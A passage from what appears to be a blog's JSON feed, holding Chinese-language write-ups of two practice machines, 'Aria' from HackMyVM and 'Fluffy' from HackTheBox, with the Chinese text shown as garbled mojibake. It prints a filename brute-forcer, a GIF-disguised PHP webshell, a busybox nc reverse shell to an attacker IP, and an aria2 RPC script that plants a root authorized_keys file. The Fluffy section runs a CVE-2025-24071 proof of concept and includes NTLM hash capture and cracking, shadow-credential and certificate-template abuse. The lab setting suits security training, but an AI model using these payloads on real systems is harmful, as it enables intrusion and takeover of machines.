ç•Œé¢ä¹Ÿæä¾›ç«‹è¶³ç‚¹è®¿é—®æƒé™ã€‚\n> \n\nå¤§æ¦‚æ˜¯å¯ä»¥é€šè¿‡ç‰¹å®šå‘½ä»¤æ¥æŸ¥çœ‹æ—¥å¿—æˆ–éšè—è·¯å¾„\n\n```bash\n$ path\nYou're close! Try a command related to revealing paths.\n$ path ls\nYou're close! Try a command related to revealing paths.\n$ path dir\nYou're close! Try a command related to revealing paths.\n$ path upload\nYou're close! Try a command related to revealing paths.\n$ path ls -al\nYou're close! Try a command related to revealing paths.\n$ path ls path\nYou're close! Try a command related to revealing paths.\n$ path ll\nYou're close! Try a command related to revealing paths.\n```\n\næƒ³ä¸åˆ°ï¼Œå†çœ‹çœ‹ `web` ç«¯\n\n![image.png](/post-images/HackMyVMAria/image2.png)\n\n### çˆ†ç ´\n\nå—ä¸äº†ï¼Œç›´æ¥è·Ÿå®ƒçˆ†äº†\n\n![BOOM-4x (2).gif](/post-images/HackMyVMAria/BOOM-4x_(2).gif)\n\n```bash\nimport time\nimport hashlib\nimport requests\nfrom datetime import datetime\n\n# --- é…ç½®åŒº ---\nTARGET_IP = '192.168.56.214'\nTARGET_PATH = '/uploads/'\nFILE_EXTENSION = '.gif'\nBASE_URL = f\"http://{TARGET_IP}{TARGET_PATH}\"\n\n# æ—¶é—´èŒƒå›´ï¼ˆç§’ï¼‰ã€‚ä¾‹å¦‚ 10 è¡¨ç¤ºä»å½“å‰æ—¶é—´çš„å‰10ç§’åˆ°å10ç§’\nTIME_WINDOW_SECONDS = 10\n# éšæœºæ•°èŒƒå›´\nRAND_MIN = 1\nRAND_MAX = 1000\n\n# --- è„šæœ¬æ ¸å¿ƒé€»è¾‘ ---\n\ndef main():\n    \"\"\"ä¸»æ‰§è¡Œå‡½æ•°\"\"\"\n    # è®¡ç®—èµ·å§‹å’Œç»“æŸæ—¶é—´æˆ³\n    current_time = int(time.time())\n    start_time = current_time - TIME_WINDOW_SECONDS\n    end_time = current_time + TIME_WINDOW_SECONDS\n\n    # æ‰“å°ä»»åŠ¡ä¿¡æ¯\n    print(\"=\" * 52)\n    print(\"å¼€å§‹çˆ†ç ´...\")\n    print(f\"ç›®æ ‡ä¸»æœº: {BASE_URL}\")\n    print(\"æˆåŠŸæ¡ä»¶: å“åº”çŠ¶æ€ç ä¸ä¸º 404\")\n    print(f\"æ—¶é—´èŒƒå›´: {datetime.fromtimestamp(start_time)} -> {datetime.fromtimestamp(end_time)}\")\n    print(f\"éšæœºæ•°èŒƒå›´: {RAND_MIN} - {RAND_MAX}\")\n    total_attempts = (end_time - start_time + 1) * RAND_MAX\n    print(f\"é¢„è®¡æ€»å°è¯•æ¬¡æ•°: {total_attempts:,}\")\n    print(\"=\" * 52)\n\n    # ä½¿ç”¨ requests.Session() å¯ä»¥å¤ç”¨TCPè¿æ¥ï¼Œæé«˜æ•ˆç‡\n    session = requests.Session()\n    session.headers.update({\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\n    }) # æ·»åŠ ä¸€ä¸ªå¸¸è§çš„User-Agentï¼Œé¿å…è¢«ä¸€äº›ç®€å•çš„WAFæ‹¦æˆª\n    \n    found = False\n    counter = 0\n\n    try:\n        # å¤–å±‚å¾ªç¯éå†æ—¶é—´æˆ³\n        for t in range(start_time, end_time + 1):\n            # å†…å±‚å¾ªç¯éå†éšæœºæ•°\n            for r in range(RAND_MIN, RAND_MAX + 1):\n                # 1. ç”ŸæˆåŸå§‹å­—ç¬¦ä¸²\n                original_string = f\"{t}{r}\"\n                \n                # 2. è®¡ç®— MD5 å“ˆå¸Œ\n                md5_hash = hashlib.md5(original_string.encode('utf-8')).hexdigest()\n                \n                # 3. æ„é€ å®Œæ•´çš„ URL\n                url = f\"{BASE_URL}{md5_hash}{FILE_EXTENSION}\"\n                \n                # å®æ—¶æ˜¾ç¤ºè¿›åº¦\n                counter += 1\n                if counter % 500 == 0:\n                    print(f\"å·²å°è¯• {counter:,} æ¬¡, å½“å‰æ—¶é—´æˆ³: {t}    \", end='\\r')\n\n                try:\n                    # 4. å‘é€ HEAD è¯·æ±‚æ£€æŸ¥\n                    response = session.head(url, timeout=2, allow_redirects=True) # allow_redirects=True å¯ä»¥è·Ÿéšé‡å®šå‘\n                    \n                    # 5. åˆ¤æ–­çŠ¶æ€ç  - å¦‚æœå“åº”ä¸æ˜¯ 404 Not Foundï¼Œå°±è®¤ä¸ºæ˜¯æˆåŠŸ\n                    if response.status_code != 404:\n                        print(\"\\n\\n[+] æˆåŠŸï¼å‘ç°ä¸€ä¸ªé 404 å“åº”ï¼\")\n                        print(f\"[+] çŠ¶æ€ç : {response.status_code}\") # æ‰“å°å®é™…çš„çŠ¶æ€ç \n                        print(f\"[+] URL: {url}\")\n                        print(f\"[+] ç”Ÿæˆæº: æ—¶é—´æˆ³={t}, éšæœºæ•°={r}\")\n                        found = True\n                        return # æ‰¾åˆ°åç›´æ¥é€€å‡ºå‡½æ•°\n                        \n                except requests.exceptions.RequestException:\n                    continue\n\n    except KeyboardInterrupt:\n        print(\"\\n\\n[!] ç”¨æˆ·æ‰‹åŠ¨ä¸­æ–­äº†è„šæœ¬ã€‚\")\n    finally:\n        print(\"\\n\" + \"=\" * 52)\n        if not found:\n            print(\"çˆ†ç ´å®Œæˆï¼Œæœªæ‰¾åˆ°æœ‰æ•ˆæ–‡ä»¶ã€‚\")\n        print(\"è„šæœ¬æ‰§è¡Œç»“æŸã€‚\")\n        print(\"=\" * 52)\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\næµ‹è¯•ä¸€ä¸‹\n\n```bash\n------geckoformboundary4729ee082d4576ee3503c0196092f36c\nContent-Disposition: form-data; name=\"file\"; filename=\"nneo.gif\"\nContent-Type: image/gif\n\nGIF89a\n\n------geckoformboundary4729ee082d4576ee3503c0196092f36c--\n```\n\n![image.png](/post-images/HackMyVMAria/image3.png)\n\nå†™é©¬å­\n\n```bash\n------geckoformboundary4729ee082d4576ee3503c0196092f36c\nContent-Disposition: form-data; name=\"file\"; filename=\"nneo.gif\"\nContent-Type: image/gif\n\nGIF89a\n<?= phpinfo();exec($_GET['x']); ?>\n\n------geckoformboundary4729ee082d4576ee3503c0196092f36c--\n```\n\né€šè¿‡é©¬å­å¼¹ä¸ª `shell`\n\n```bash\n?x=busybox+nc+192.168.56.5+1234+-e+%2Fbin%2Fbash\n```\n\n![image.png](/post-images/HackMyVMAria/image4.png)\n\nå¯ä»¥æ‹¿åˆ° `user.txt`\n\n```bash\ncat user.txt\nflag{user-d13adadc6bbc1391394a5198cba2d1d7}\n```\n\n## ææƒ\n\n### ä¿¡æ¯æ”¶é›†\n\né¦–å…ˆæ‹¿åˆ°å®Œæ•´ shell ï¼ˆç•¥ï¼‰\n\næŸ¥çœ‹æ­£åœ¨ç›‘å¬ç«¯å£ï¼Œå‘ç°æœ¬åœ°å¼€ç€ `6800`\n\n```bash\nwww-data@Aria:/$ ss -tulpn\nNetid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   \nudp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      \ntcp     LISTEN   0        5                0.0.0.0:1337          0.0.0.0:*      \ntcp     LISTEN   0        128            127.0.0.1:6800          0.0.0.0:*      \ntcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      \ntcp     LISTEN   0        128                    *:80                  *:*      \ntcp     LISTEN   0        128                [::1]:6800             [::]:*      \ntcp     LISTEN   0        128                 [::]:22               [::]:* \n```\n\né€šè¿‡ socat è½¬å‘å‡ºå»\n\n```bash\nwww-data@Aria:/tmp$ ./socat TCP-LISTEN:6801,fork TCP4:127.0.0.1:6800 &\n[1] 25929\n```\n\nä½†è²Œä¼¼å¹¶ä¸æ˜¯ HTTP æœåŠ¡ï¼Œç»“åˆå§å”§åç§°å’Œæœç´¢å¼•æ“ï¼Œå¤§è‡´ç¡®å®šæ˜¯ aria2 çš„ RPC ç«¯å£ï¼Œåº”è¯¥èƒ½ä»ä¸Šé¢æ‹¿åˆ°ä»€ä¹ˆæ–‡ä»¶\n\n> Aria2 æ˜¯ä¸€æ¬¾è‡ªç”±ã€è·¨å¹³å°å‘½ä»¤è¡Œç•Œé¢çš„ä¸‹è½½ç®¡ç†å™¨ï¼Œè¯¥è½¯ä»¶æ ¹æ® GPLv2 è®¸å¯è¯è¿›è¡Œåˆ†å‘\n> \n\n### Aria2 PRC - 1\n\næ‰¾åˆ°å®˜æ–¹æ–‡æ¡£ï¼Œæµ‹è¯•ä¸€ä¸‹ PRC æ¥å£\n\n> https://aria2.github.io/manual/en/html/aria2c.html#terminology | https://aria2.github.io/manual/en/html/aria2c.html#json-rpc-over-websocket\n> \n\næµ‹è¯•ï¼Œç¡®å®æœ‰å›æ˜¾\n\n```bash\nâœ  Aria curl 192.168.56.116:6801/jsonrpc\n{\"id\":null,\"jsonrpc\":\"2.0\",\"error\":{\"code\":-32600,\"message\":\"Invalid Request.\"}}# \n```\n\næµ‹è¯•ä¸€ä¸‹æ–¹æ³•ï¼Œå‘ç°éœ€è¦è®¤è¯\n\n> è¦ä½¿ç”¨ RPC æ–¹æ³•çº§æˆæƒï¼Œç”¨æˆ·å¿…é¡»ä½¿ç”¨Â **`--rpc-secret`**Â é€‰é¡¹æŒ‡å®š RPC ç§˜å¯†æˆæƒä»¤ç‰Œ\n> \n\n```bash\nâœ  Aria curl '192.168.56.116:6801/jsonrpc?method=aria2.tellStatus&id=foo'                                   \n{\"id\":\"foo\",\"jsonrpc\":\"2.0\",\"error\":{\"code\":1,\"message\":\"Unauthorized\"}}# \n```\n\n### é›¶å®½åº¦å­—ç¬¦\n\næ‰€ä»¥ç°åœ¨çš„ç›®æ ‡æ˜¯è¦æ‰¾åˆ° `Token`\n\næœ€åå‘ç° `user.txt` ä¸æ­£å¸¸\n\n![image.png](/post-images/HackMyVMAria/image5.png)\n\n- **`E2 80 8B`**: è¿™æ˜¯ UTF-8 ç¼–ç ä¸‹çš„Â **é›¶å®½ç©ºæ ¼ (Zero-Width Space, ZWSP)**ã€‚å®ƒæ˜¯ä¸€ä¸ªåœ¨æ’ç‰ˆä¸­ç”¨äºåœ¨ä¸æ–­è¯çš„åœ°æ–¹å…è®¸æ¢è¡Œçš„å­—ç¬¦ï¼Œä½†å®ƒæœ¬èº«**å®Œå…¨ä¸å¯è§**ï¼Œä¹Ÿä¸å æ®ä»»ä½•å®½åº¦ã€‚\n- **`E2 80 8C`**: è¿™æ˜¯ UTF-8 ç¼–ç ä¸‹çš„Â **é›¶å®½éè¿æ¥ç¬¦ (Zero-Width Non-Joiner, ZWNJ)**ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ª**å®Œå…¨ä¸å¯è§**çš„æ§åˆ¶å­—ç¬¦ã€‚\n\nè¿™åº”è¯¥æ˜¯é›¶å®½åº¦å­—èŠ‚éšå†™ï¼Œé€šè¿‡åœ¨çº¿å·¥å…·è¿›è¡Œè§£å¯†ï¼Œé€šè¿‡æœç´¢å¼•æ“æœç´¢ï¼šZero-Width Space Steganography èƒ½æ‰¾åˆ°å¯ç”¨çš„åœ¨çº¿å·¥å…·ï¼Œå°è¯•äº†å¾ˆå¤šä¸ªï¼Œæœ€åè¿™ä¸ªèƒ½ç”¨\n\n> https://stegzero.com/\n> \n\n![image.png](/post-images/HackMyVMAria/image6.png)\n\nå¾—åˆ° `token: maze-sec`\n\n### Aria2 PRC - 2\n\nåœ¨æ–‡æ¡£ä¸­èƒ½çœ‹åˆ°ä¸Šä¼ çš„äº†ä¾‹å­ï¼Œæˆ‘ä»¬è®© AI è¿›è¡Œä¿®æ”¹ä¸€ä¸‹ï¼Œä¸Šä¼ å…¬é’¥æ–‡ä»¶\n\n```bash\n#!/usr/bin/python2\n# -*- coding: utf-8 -*-\n\nimport urllib2\nimport json\n\n# 1. Your attacker machine's IP address and web server port\nattacker_ip = \"192.168.56.5\" \nattacker_port = 8080\n\n# 2. The URL to your malicious authorized_keys file\npayload_url = \"http://{}:{}/authorized_keys\".format(attacker_ip, attacker_port)\n\n# 3. The secret token for the aria2 RPC interface\nrpc_token = \"maze-sec\"\n\n# 4. Build the aria2 JSON-RPC request\njsonreq = json.dumps({\n    'jsonrpc': '2.0',\n    'id': 'qwer',\n    'method': 'aria2.addUri',\n    'params': [\n        \"token:{}\".format(rpc_token),  # <-- THIS IS THE CRUCIAL ADDITION\n        [payload_url],                 # The URL list is now the second parameter\n        {                              # The options object is now the third\n            'dir': '/root/.ssh',\n            'out': 'authorized_keys'\n        }\n    ]\n})\n\nprint \"Sending payload with token to aria2...\"\n\n# 5. Send the request\ntry:\n    c = urllib2.urlopen('http://192.168.56.116:6801/jsonrpc', jsonreq)\n    print \"Payload sent successfully!\"\n    print \"Server response:\", c.read()\n    print \"\\nCheck your web server logs to see if the file was downloaded.\"\n    print \"If successful, you should now be able to SSH as root.\"\nexcept urllib2.HTTPError as e:\n    print \"HTTP Error:\", e.code\n    print \"Response body:\", e.read()\nexcept Exception as e:\n    print \"An error occurred:\", e\n```\n\nä¿®æ”¹è„šæœ¬åè¿è¡Œè„šæœ¬ï¼Œä¸Šä¼ æˆåŠŸ\n\n![image.png](/post-images/HackMyVMAria/image7.png)\n\né€šè¿‡ç§é’¥è¿›è¡Œç™»å½•ï¼ŒæˆåŠŸç™»å½•\n\n![image.png](/post-images/HackMyVMAria/image8.png)\n\nè¯»å– `root.txt`\n\n```bash\nroot@Aria:~# cat root.txt \nflag{root-374495cbd5d79b6e45b7778cbac070cc}\n```\n\n## æ€»ç»“\n\nMedium ï¼Ÿ",
            "url": "https://www.sunsetaction.top/2025/09/23/HackMyVMAria",
            "title": "HackMyVM - Aria",
            "summary": "Aria. https://hackmyvm.eu/machines/machine.php?vm=Aria Recon ç«¯å£æ‰«æ 80 ç«¯å£ ç»™å‡ºäº†ä¸€ç‚¹ä¿¡æ¯ é€šè¿‡ md5(time()Â·rand(1,1000)) ç”Ÿæˆä¸å¯é¢„æµ‹çš„æ–‡ä»¶å å¹¶ä¸”æ–‡ä»¶å†…å®¹ä¸å¯åŒ…å« <?php ä»¥åŠæ–‡ä»¶åä»…ä»…å¯ä»¥æ˜¯ gif...",
            "date_modified": "2025-09-23T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HMV",
                "Aria2",
                "Zero-Width",
                "Space",
                "Steganography",
                "Brute"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/20/HackTheBoxSeason8 - Fluffy",
            "content_html": "\n# Season8 - Fluffy\n\n> https://app.hackthebox.com/machines/Fluffy | `Windows` Â· `Easy`\n> \n\n**Machine Informationï¼š**As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!\n\n## å‰æœŸè¸©ç‚¹\n\n```bash\nâœ nmap -sT -min-rate 5000 -p- 10.10.11.69       \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:53 EDT\nNmap scan report for 10.10.11.69\nHost is up (0.15s latency).\nNot shown: 65524 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n636/tcp   open  ldapssl\n3269/tcp  open  globalcatLDAPssl\n9389/tcp  open  adws\n49667/tcp open  unknown\n49677/tcp open  unknown\n49695/tcp open  unknown\n49701/tcp open  unknown\n```\n\nè¿™æ¬¡çš„é¶æœºä¾æ—§æ˜¯æ²¡æœ‰`Web` \n\n```bash\nâœ nmap -sT -A -T4 -O -p 53,139,445 10.10.11.69                                                                                                                               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 00:59 EDT\nNmap scan report for 10.10.11.69\nHost is up (0.16s latency).\n\nPORT    STATE SERVICE       VERSION\n53/tcp  open  domain        Simple DNS Plus\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019 (88%)\nAggressive OS guesses: Microsoft Windows Server 2019 (88%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2025-05-25T11:38:32\n|_  start_date: N/A\n|_clock-skew: 6h38m59s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   183.42 ms 10.10.16.1\n2   183.81 ms 10.10.11.69\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 63.00 seconds\n\n```\n\n## ä¿¡æ¯æ”¶é›†\n\n### SMB\n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990!\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! \n```\n\næšä¸¾ç”¨æˆ·\n\n```bash\nâœ  nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --rid-brute | grep \"SidTypeUser\" | awk -F '\\\\' '{print $2}' | awk '{print $1}' \nGuest\nkrbtgt\nDC01$\nca_svc\nldap_svc\np.agila\nwinrm_svc\nj.coffey\nj.fleischman\n```\n\n`SMB` ä¿¡æ¯æ”¶é›†\n\n```bash\nâœ smbclient -L 10.10.11.69 -U fluffy.htb/j.fleischman%J0elTHEM4n1990!\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        IT              Disk      \n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\n```bash\nâœ smbclient //10.10.11.69/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990!\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Sun May 25 08:21:54 2025\n  ..                                  D        0  Sun May 25 08:21:54 2025\n  0x5chltz.library-ms                 A      364  Sun May 25 08:13:39 2025\n  1.lnk                               A     2164  Sun May 25 07:59:46 2025\n  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025\n  Everything-1.4.1.1026.x64.zip       A      317  Sun May 25 08:06:27 2025\n  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025\n  KeePass-2.58.zip                    A      317  Sun May 25 08:06:16 2025\n  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025\n\n                5842943 blocks of size 4096. 1849449 blocks available\n```\n\n `Upgrade_Notice.pdf` åƒæ˜¯æ¸—é€æµ‹è¯•æŠ¥å‘Šä¸€æ ·çš„ä¸œè¥¿\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image.png)\n\nä¸‹è¾¹æœ‰æŠ«éœ²çš„å…¬å¼€æ¼æ´\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image1.png)\n\nèƒ½çœ‹åˆ°æœ‰ä¸¤ä¸ª `Critical` æ¼æ´ä»¥åŠä¸¤ä¸ª `High` æ¼æ´\n\n### CVE-2025-24071\n\nå¯¹æ¯”äº†ä¸¤ä¸ªæ¼æ´ `CVE-2025-24996` å’Œ `CVE-2025-24071`\n\nå…¶ä¸­ `CVE-2025-24996` ç½‘ä¸Šæ–‡ç« å¹¶ä¸å¤šï¼Œè€Œ `CVE-2025-24071` ä¼šæœ‰å¤ç°æ–‡ç« ï¼Œæ‰€ä»¥ä¾§é‡äº `CVE-2025-24071`\n\nå¤ç°æ–‡ç« ï¼šhttps://blog.csdn.net/weixin_42773448/article/details/146436061\n\nå·¥å…·ï¼šhttps://github.com/0x6rss/CVE-2025-24071_PoC\n\n```bash\nâœ  CVE-2025-24071_PoC git:(main) python poc.py \nEnter your file name: doc\nEnter IP (EX: 192.168.1.162): 10.10.16.16\ncompleted\n```\n\nä¸Šä¼ åˆ° `IT`\n\n```bash\nsmb: \\> put exploit.zip\nputting file exploit.zip as \\exploit.zip (0.8 kb/s) (average 0.8 kb/s)\n```\n\nåŒæ—¶å¼€å¯`responder`ç›‘å¬\n\n```bash\nâœ responder -I tun0 -wd\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.5.0\n\n  To support this project:\n  Github -> https://github.com/sponsors/lgandx\n  Paypal  -> https://paypal.me/PythonResponder\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n```\n\nç­‰ä¸€ä¼šèƒ½å°±æ¥æ”¶åˆ° `p.agila` ç”¨æˆ· `NET NTLM hash`\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image2.png)\n\n```bash\np.agila::FLUFFY:56ab772ca1eae1e3:E1A831FDA20AA227AD2187ABCD5C3737:01010000000000008003A3D819CDDB010A2E54C0A8C85EC30000000002000800330037003200460001001E00570049004E002D0059005000570030004F00330051004D0053004500480004003400570049004E002D0059005000570030004F00330051004D005300450048002E0033003700320046002E004C004F00430041004C000300140033003700320046002E004C004F00430041004C000500140033003700320046002E004C004F00430041004C00070008008003A3D819CDDB01060004000200000008003000300000000000000001000000002000009850210C3B697422BCA38C6B2216E754DBFB52DA16AAC86C61528CEE298FC1640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310036000000000000000000  \n```\n\nä½¿ç”¨ `hashcat` è¿›è¡Œç ´è§£ç”¨æˆ·å‡­æ®\n\n```bash\nâœ hashcat -m 5600 'xxxx' /usr/share/wordlists/rockyou.txt \n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image3.png)\n\nå¾—åˆ°å¯†ç  `prometheusx-303` \n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ crackmapexec smb 10.10.11.69 -u p.agila -p prometheusx-303\nSMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.69     445    DC01             [+] fluffy.htb\\p.agila:prometheusx-303 \n```\n\n### BloodHound\n\nè¿™é‡Œä½¿ç”¨ `BloodHound` è¿›è¡Œæšä¸¾åŸŸæ”»å‡»è·¯çº¿\n\n```bash\nntpdate -s 10.10.11.69 && bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' -ns 10.10.11.69 --zip -c All -dc DC.fluffy.htb\n```\n\n```bash\nâœ ntpdate -s 10.10.11.69 && bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' -ns 10.10.11.69 --zip -c All -dc DC01.fluffy.htb\nINFO: Found AD domain: fluffy.htb\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.fluffy.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.fluffy.htb\nINFO: Found 10 users\nINFO: Found 54 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.fluffy.htb\nINFO: Done in 00M 24S\nINFO: Compressing output into 20250525091352_bloodhound.zip\n```\n\nç”¨æˆ· `p.agila` å±äº `SERVICE ACCOUNT MANGERS` å’Œ `SERVICE ACCOUNTS` ç»„ï¼Œå…¶ä¸­`SERVICE ACCOUNT MANGERS` å¯¹ `SERVICE ACCOUNTS` ç»„æœ‰ `GenericAll` æƒé™\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image4.png)\n\nç„¶åè¿œç¨‹æœåŠ¡ç”¨æˆ· `WINRM_SVC` ç­‰ä¹Ÿæ˜¯åœ¨ `SERVICE ACCOUNTS` ç»„å†…\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image5.png)\n\n## åŸŸæ¸—é€\n\n### To Winrm_svc\n\nå¯ä»¥ä½¿ç”¨ `GetUserSPNs` è·å–æœåŠ¡ç”¨æˆ· `HASH` æ¥è¿›è¡Œç ´è§£\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image6.png)\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image7.png)\n\nä½†æ˜¯å¹¶æ— æ³•ç ´è§£æˆåŠŸï¼ŒæœåŠ¡è´¦æˆ·å¯†ç éƒ½æ˜¯éšæœºçš„â€¦\n\nå½±å­ç”¨æˆ·(`Shadow Credential Attack`)å¯åŠ¨\n\n```bash\nâœ certipy shadow auto -username \"p.agila@fluffy.htb\" -p \"prometheusx-303\" -account WINRM_SVC -dc-ip 10.10.11.69\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image8.png)\n\n```bash\nâœ export KRB5CCNAME=winrm_svc.ccache \n```\n\n`evil-winrm` ç™»å½•\n\n```bash\nâœ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\winrm_svc\\Documents> \n```\n\n`user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\winrm_svc\\Desktop> type user.txt\n9e23a6ed83a674306f7fad569aa292bb\n```\n\n### å¯»æ‰¾æ”»å‡»è·¯çº¿\n\nç»§ç»­å¯»æ‰¾ææƒè·¯çº¿\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image9.png)\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image10.png)\n\næ„Ÿè§‰è¿˜æ˜¯è¦æ‹¿ `CA_SVC` ç”¨æˆ·è¿›è¡Œä¸€äº›æ”»å‡»ï¼Œä¾‹å¦‚ `ADCS` æ”»å‡»ï¼Œå› ä¸ºå®ƒæ˜¯ `CA` æœåŠ¡ç”¨æˆ·\n\nä½¿ç”¨ `certipy` ï¼ˆè¿™é‡Œéœ€è¦å¯¹`certipy`è¿›è¡Œæ›´æ–°ï¼Œåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œæ„£æ˜¯æ‰¾ä¸åˆ°æ”»å‡»è·¯å¾„ï¼‰æšä¸¾å¯èƒ½çš„æ¼æ´ä¿¡æ¯\n\n```bash\nâœ certipy find -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -vulnerable     \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 33 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 11 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 14 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP\n[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'\n[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[*] Saving text output to '20250525110326_Certipy.txt'\n[*] Wrote text output to '20250525110326_Certipy.txt'\n[*] Saving JSON output to '20250525110326_Certipy.json'\n[*] Wrote JSON output to '20250525110326_Certipy.json'\n\n```\n\nå­˜åœ¨ `ESC16`\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Fluffy/image11.png)\n\n### ESC16\n\nåˆ©ç”¨é“¾æ¥ï¼šhttps://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally\n\nå½±å­ç”¨æˆ·è·å– `CA_SVC` çš„ `NT hash` \n\n```bash\nâœ certipy shadow auto -username \"p.agila@fluffy.htb\" -p \"prometheusx-303\" -account CA_SVC -dc-ip 10.10.11.69\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Targeting user 'ca_svc'\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating Key Credential\n[*] Key Credential generated with DeviceID '7f0851e9-35c3-eccb-fd92-b35465aa5f94'\n[*] Adding Key Credential with device ID '7f0851e9-35c3-eccb-fd92-b35465aa5f94' to the Key Credentials for 'ca_svc'\n[*] Successfully added Key Credential with device ID '7f0851e9-35c3-eccb-fd92-b35465aa5f94' to the Key Credentials for 'ca_svc'\n[*] Authenticating as 'ca_svc' with the certificate\n[*] Using principal: ca_svc@fluffy.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'ca_svc.ccache'\n[*] Trying to retrieve NT hash for 'ca_svc'\n[*] Restoring the old Key Credentials for 